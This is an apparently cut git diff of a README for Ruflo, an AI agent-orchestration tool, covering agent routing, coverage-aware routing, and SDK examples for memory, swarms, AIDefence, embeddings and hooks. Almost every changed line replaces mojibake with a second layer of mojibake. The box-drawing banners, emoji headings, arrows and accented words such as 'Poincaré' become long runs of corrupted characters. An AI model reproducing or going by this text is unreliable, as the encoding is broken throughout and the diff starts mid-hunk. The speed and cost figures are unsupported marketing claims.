ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â£
-# Ã¢â€¢â€˜ Task: "refactor authentication to use JWT"                    Ã¢â€¢â€˜
-# Ã¢â€¢â€˜                                                                Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Recommended Agent: security-architect                         Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Confidence: 94%                                                Ã¢â€¢â€˜
-# Ã¢â€¢â€˜                                                                Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Why this agent?                                                Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Ã¢â‚¬Â¢ Domain match: authentication, security                       Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Ã¢â‚¬Â¢ Historical success: 12/13 similar tasks (92%)                Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Ã¢â‚¬Â¢ Expertise: JWT, OAuth, session management                    Ã¢â€¢â€˜
-# Ã¢â€¢â€˜                                                                Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Alternative agents:                                            Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Ã¢â‚¬Â¢ coder (78% confidence) - general implementation              Ã¢â€¢â€˜
-# Ã¢â€¢â€˜ Ã¢â‚¬Â¢ backend-dev (71% confidence) - API expertise                 Ã¢â€¢â€˜
-# Ã¢â€¢Å¡Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬â€
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ                    ROUTING RECOMMENDATION                     ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â£
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ Task: "refactor authentication to use JWT"                    ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ                                                                ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ Recommended Agent: security-architect                         ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ Confidence: 94%                                                ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ                                                                ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ Why this agent?                                                ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ Domain match: authentication, security                       ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ Historical success: 12/13 similar tasks (92%)                ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ Expertise: JWT, OAuth, session management                    ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ                                                                ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ Alternative agents:                                            ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ coder (78% confidence) - general implementation              ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ backend-dev (71% confidence) - API expertise                 ÃƒÂ¢Ã¢â‚¬Â¢Ã¢â‚¬Ëœ
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã…Â¡ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
 ```
 
 ### Coverage-Aware Routing
@@ -4426,9 +4426,9 @@ Routes tasks to agents based on **test coverage gaps**:
 npx ruflo@latest route coverage
 
 # Finds untested code and routes to tester agent:
-# Ã¢â‚¬Â¢ src/auth/jwt.ts - 23% coverage Ã¢â€ â€™ tester
-# Ã¢â‚¬Â¢ src/api/users.ts - 45% coverage Ã¢â€ â€™ tester
-# Ã¢â‚¬Â¢ src/utils/crypto.ts - 0% coverage Ã¢â€ â€™ security-architect + tester
+# ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ src/auth/jwt.ts - 23% coverage ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ tester
+# ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ src/api/users.ts - 45% coverage ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ tester
+# ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ src/utils/crypto.ts - 0% coverage ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ security-architect + tester
 ```
 
 ### Routing Hooks
@@ -4445,10 +4445,10 @@ npx ruflo@latest hooks post-task --task-id "task-123" --success true --agent cod
 
 | Iteration | Action | Result |
 |-----------|--------|--------|
-| 1 | Route "auth task" Ã¢â€ â€™ coder | Ã¢ÂÅ’ Failed (missing security context) |
-| 2 | Route "auth task" Ã¢â€ â€™ security-architect | Ã¢Å“â€¦ Success |
-| 3 | Route "auth task" Ã¢â€ â€™ security-architect | Ã¢Å“â€¦ Success |
-| N | Route "auth task" Ã¢â€ â€™ security-architect | 94% confidence (learned) |
+| 1 | Route "auth task" ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ coder | ÃƒÂ¢Ã‚ÂÃ…â€™ Failed (missing security context) |
+| 2 | Route "auth task" ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ security-architect | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Success |
+| 3 | Route "auth task" ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ security-architect | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Success |
+| N | Route "auth task" ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ security-architect | 94% confidence (learned) |
 
 The system **remembers** what works and applies it to future similar tasks.
 
@@ -4456,12 +4456,12 @@ The system **remembers** what works and applies it to future similar tasks.
 
 ---
 
-## Ã°Å¸â€™Â» Programmatic Usage
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â» Programmatic Usage
 
 Use Ruflo packages directly in your applications.
 
 <details>
-<summary>Ã°Å¸â€™Â» <strong>Programmatic SDK</strong> Ã¢â‚¬â€ Use Ruflo in Your Code</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â» <strong>Programmatic SDK</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Use Ruflo in Your Code</summary>
 
 Use Ruflo packages directly in your TypeScript/JavaScript applications.
 
@@ -4478,7 +4478,7 @@ npm install ruflo@latest
 ### Quick Examples
 
 <details open>
-<summary>Ã°Å¸Â§Â  <strong>Memory & Vector Search</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>Memory & Vector Search</strong></summary>
 
 ```typescript
 import { AgentDB } from '@claude-flow/memory';
@@ -4529,7 +4529,7 @@ npx ruflo@latest memory stats
 </details>
 
 <details>
-<summary>Ã°Å¸ÂÂ <strong>Swarm Coordination</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â <strong>Swarm Coordination</strong></summary>
 
 ```typescript
 import { createSwarm } from '@claude-flow/swarm';
@@ -4559,7 +4559,7 @@ await swarm.shutdown({ graceful: true });
 </details>
 
 <details>
-<summary>Ã°Å¸â€ºÂ¡Ã¯Â¸Â <strong>Security & AIDefence</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Security & AIDefence</strong></summary>
 
 ```typescript
 import { isSafe, checkThreats, createAIDefence } from '@claude-flow/aidefence';
@@ -4590,16 +4590,16 @@ await aidefence.learnFromDetection(userInput, analysis, {
 </details>
 
 <details>
-<summary>Ã°Å¸â€œÅ  <strong>Embeddings Ã¢â‚¬â€ Multi-Provider with Fine-Tuning & Hyperbolic Space</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  <strong>Embeddings ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Multi-Provider with Fine-Tuning & Hyperbolic Space</strong></summary>
 
 ### Provider Comparison
 
 | Provider | Latency | Quality | Cost | Offline | Best For |
 |----------|---------|---------|------|---------|----------|
-| **Agentic-Flow (ONNX)** | ~3ms | Good | Free | Ã¢Å“â€¦ | Production (faster with ONNX runtime) |
-| **OpenAI** | ~50-100ms | Excellent | $0.02-0.13/1M | Ã¢ÂÅ’ | Highest quality |
-| **Transformers.js** | ~230ms | Good | Free | Ã¢Å“â€¦ | Local development |
-| **Mock** | <1ms | N/A | Free | Ã¢Å“â€¦ | Testing |
+| **Agentic-Flow (ONNX)** | ~3ms | Good | Free | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ | Production (faster with ONNX runtime) |
+| **OpenAI** | ~50-100ms | Excellent | $0.02-0.13/1M | ÃƒÂ¢Ã‚ÂÃ…â€™ | Highest quality |
+| **Transformers.js** | ~230ms | Good | Free | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ | Local development |
+| **Mock** | <1ms | N/A | Free | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ | Testing |
 
 ### Basic Usage
 
@@ -4608,7 +4608,7 @@ import { createEmbeddingService, cosineSimilarity } from '@claude-flow/embedding
 
 // Auto-selects best provider (agentic-flow ONNX preferred)
 const embeddings = await createEmbeddingService({
-  provider: 'auto',        // agentic-flow Ã¢â€ â€™ transformers Ã¢â€ â€™ mock
+  provider: 'auto',        // agentic-flow ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ transformers ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ mock
   autoInstall: true,       // Auto-install agentic-flow if missing
   dimensions: 384,
   cache: { enabled: true, maxSize: 10000 }
@@ -4667,7 +4667,7 @@ const minMax = minMaxNormalize(embedding); // Values in [0, 1]
 const zScore = zScoreNormalize(embedding); // Mean 0, std 1
 ```
 
-### Hyperbolic Embeddings (PoincarÃƒÂ© Ball)
+### Hyperbolic Embeddings (PoincarÃƒÆ’Ã‚Â© Ball)
 
 Better representation for hierarchical code structures:
 
@@ -4682,10 +4682,10 @@ import {
 // Convert to hyperbolic space (better for tree-like structures)
 const poincare = euclideanToPoincare(embedding);
 
-// Hyperbolic distance (geodesic in PoincarÃƒÂ© ball)
+// Hyperbolic distance (geodesic in PoincarÃƒÆ’Ã‚Â© ball)
 const dist = hyperbolicDistance(embedding1, embedding2);
 
-// Hyperbolic centroid (FrÃƒÂ©chet mean)
+// Hyperbolic centroid (FrÃƒÆ’Ã‚Â©chet mean)
 const centroid = hyperbolicCentroid([embed1, embed2, embed3]);
 
 // Why hyperbolic? Better for:
@@ -4802,7 +4802,7 @@ ruflo embeddings cache clear --older-than 7d
 </details>
 
 <details>
-<summary>Ã°Å¸ÂªÂ <strong>Hooks & Learning</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂªÃ‚Â <strong>Hooks & Learning</strong></summary>
 
 ```typescript
 import { HooksService } from '@claude-flow/hooks';
@@ -4850,12 +4850,12 @@ await hooks.endTrajectory(trajectory, { success: true });
 
 ---
 
-## Ã°Å¸â€â€” Ecosystem & Integrations
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â€ Ecosystem & Integrations
 
 Core infrastructure packages powering Ruflo's intelligence layer.
 
 <details>
-<summary>Ã¢Å¡Â¡ <strong>Agentic-Flow Integration</strong> Ã¢â‚¬â€ Core AI Infrastructure</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã‚Â¡ <strong>Agentic-Flow Integration</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Core AI Infrastructure</summary>
 
 [![npm version](https://img.shields.io/npm/v/agentic-flow?color=blue&label=npm)](https://www.npmjs.com/package/agentic-flow)
 [![npm downloads](https://img.shields.io/npm/dm/agentic-flow?color=green)](https://www.npmjs.com/package/agentic-flow)
@@ -4876,7 +4876,7 @@ npx agentic-flow --help
 npx agentic-flow mcp start
 
 # Add to Claude Code
-# agentic-flow MCP server (optional) â€” add to .cursor/mcp.json if needed
+# agentic-flow MCP server (optional) Ã¢â‚¬â€ add to .cursor/mcp.json if needed
 ```
 
 ### Core Components
@@ -4891,7 +4891,7 @@ npx agentic-flow mcp start
 | **QUIC Transport** | High-performance transport | Ultra-low latency |
 
 <details>
-<summary>Ã¢Å¡Â¡ <strong>Agent Booster</strong> Ã¢â‚¬â€ 352x Faster Code Transformations</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã‚Â¡ <strong>Agent Booster</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 352x Faster Code Transformations</summary>
 
 Agent Booster performs mechanical code edits without calling LLM APIs:
 
@@ -4921,18 +4921,18 @@ npx agentic-flow agent-booster parse-md response.md
 ```
 
 **Use Cases:**
-- Ã¢Å“â€¦ Variable/function renaming across files
-- Ã¢Å“â€¦ Adding imports, type annotations
-- Ã¢Å“â€¦ Code formatting, signature updates
-- Ã¢ÂÅ’ Complex refactoring (use LLM)
-- Ã¢ÂÅ’ Bug fixes requiring reasoning (use LLM)
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Variable/function renaming across files
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Adding imports, type annotations
+- ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Code formatting, signature updates
+- ÃƒÂ¢Ã‚ÂÃ…â€™ Complex refactoring (use LLM)
+- ÃƒÂ¢Ã‚ÂÃ…â€™ Bug fixes requiring reasoning (use LLM)
 
 **ROI Example:** 1000 edits/day saves $10/day + 5.86 minutes = **$3,650/year**
 
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>ReasoningBank</strong> Ã¢â‚¬â€ Learning Memory System</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>ReasoningBank</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Learning Memory System</summary>
 
 ReasoningBank stores successful patterns for future retrieval:
 
@@ -4960,15 +4960,15 @@ await bank.consolidate();  // Prevent forgetting (EWC++)
 ```
 
 **4-Step Pipeline:**
-1. **RETRIEVE** Ã¢â‚¬â€ Fetch relevant patterns via HNSW (150x faster)
-2. **JUDGE** Ã¢â‚¬â€ Evaluate outcomes with verdicts
-3. **DISTILL** Ã¢â‚¬â€ Extract key learnings via LoRA
-4. **CONSOLIDATE** Ã¢â‚¬â€ Prevent catastrophic forgetting (EWC++)
+1. **RETRIEVE** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Fetch relevant patterns via HNSW (150x faster)
+2. **JUDGE** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Evaluate outcomes with verdicts
+3. **DISTILL** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Extract key learnings via LoRA
+4. **CONSOLIDATE** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Prevent catastrophic forgetting (EWC++)
 
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â¢ <strong>ONNX Embeddings</strong> Ã¢â‚¬â€ 75x Faster Local Vectors</summary>
